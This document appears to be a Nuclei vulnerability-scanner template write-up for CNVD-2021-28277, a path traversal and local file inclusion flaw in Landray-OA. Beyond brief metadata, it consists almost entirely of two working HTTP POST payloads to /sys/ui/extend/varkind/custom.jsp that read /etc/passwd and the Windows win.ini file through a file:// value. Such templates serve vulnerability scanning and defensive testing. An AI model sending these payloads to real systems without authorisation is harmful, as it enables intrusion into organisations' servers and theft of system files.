# Nuclei Template: Landray-OA - Local File Inclusion
**Template ID:** CNVD-2021-28277
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`CNVD-2021-28277.yaml`)

## Vulnerability Information & PoC

## Description
Landray-OA is susceptible to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"file:///etc/passwd"}}

POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"file:///c://windows/win.ini"}}
```
